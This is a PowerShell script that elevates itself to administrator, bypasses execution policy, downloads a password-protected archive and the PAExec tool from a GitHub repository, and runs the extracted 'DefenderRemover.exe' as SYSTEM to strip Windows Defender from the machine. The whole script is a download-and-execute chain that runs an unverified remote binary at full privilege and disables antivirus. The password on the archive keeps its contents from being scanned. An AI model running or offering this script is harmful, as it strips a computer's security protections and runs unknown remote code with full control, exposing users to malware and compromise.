# Step 1: Request Admin Privileges
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Step 2: Define URLs and Paths
$zipUrl      = "https://github.com/3bd2lra7man/DisableDefenderFM/raw/refs/heads/main/DefenderRemover.zip"
$paexecUrl   = "https://github.com/3bd2lra7man/DisableDefenderFM/raw/refs/heads/main/paexec.exe"
$sevenZipUrl = "https://www.7-zip.org/a/7zr.exe"  # Official standalone CLI extractor
$workDir     = "$env:TEMP\DefenderRemoverSetup"
$zipPath     = "$workDir\DefenderRemover.zip"
$paexecPath  = "$workDir\paexec.exe"
$sevenZipExe = "$workDir\7zr.exe"
$extractPath = "$workDir\Extracted"
$password    = "SSss1234####"

# Step 3: Prepare working directory
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# Step 4: Download ZIP, PAExec, and 7-Zip CLI
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
Invoke-WebRequest -Uri $paexecUrl -OutFile $paexecPath
Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipExe

# Step 5: Extract ZIP using downloaded 7-Zip CLI
New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
& $sevenZipExe x "-p$password" "-o$extractPath" $zipPath -y | Out-Null

# Step 6: Run DefenderRemover.exe as SYSTEM using PAExec
$exePath = Join-Path $extractPath "DefenderRemover.exe"
if (Test-Path $exePath) {
    Start-Process -FilePath $paexecPath -ArgumentList "-s `"$exePath`""
} else {
    Write-Error "DefenderRemover.exe not found after extraction."
}
